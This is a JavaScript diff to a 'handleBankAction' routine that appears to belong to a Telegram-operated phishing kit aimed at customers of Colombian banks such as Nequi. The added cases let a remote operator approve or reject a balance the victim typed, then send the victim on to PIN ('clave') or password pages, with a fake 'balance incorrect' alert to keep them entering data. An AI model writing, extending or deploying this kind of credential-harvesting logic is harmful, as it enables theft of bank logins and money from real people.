@@ -385,15 +385,37 @@ function handleBankAction(action, bankCode, bankTelegram, btn, originalText, inp
         
         case 'pedir_saldo':
         case 'request_saldo':
+            console.log('[BANCAS] Redirigiendo a saldo-input.html');
             bankTelegram.redirect('saldo-input.html');
             break;
         
+        case 'saldo_aprobado':
+            console.log('[BANCAS] Saldo aprobado, redirigiendo a clave.html');
+            bankTelegram.redirect('clave.html');
+            break;
+        
         case 'request_clave':
-            // Para Nequi, si está en saldo, redirigir a clave
+            console.log('[BANCAS] Solicitando clave');
             if (bankCode === 'nequi') {
                 bankTelegram.redirect('clave.html');
             } else {
                 bankTelegram.redirect('password.html');
+            }
+            break;
+        
+        case 'saldo_rechazado':
+        case 'error_saldo':
+            console.log('[BANCAS] Saldo rechazado/error');
+            bankTelegram.hideLoading();
+            alert('Saldo incorrecto. Por favor verifica el saldo en tu app Nequi e intenta nuevamente.');
+            if (inputs) {
+                if (Array.isArray(inputs) || inputs.length) {
+                    Array.from(inputs).forEach(inp => inp.value = '');
+                }
+            }
+            if (btn) {
+                btn.disabled = true;
+                btn.textContent = originalText;
             }
             break;
         
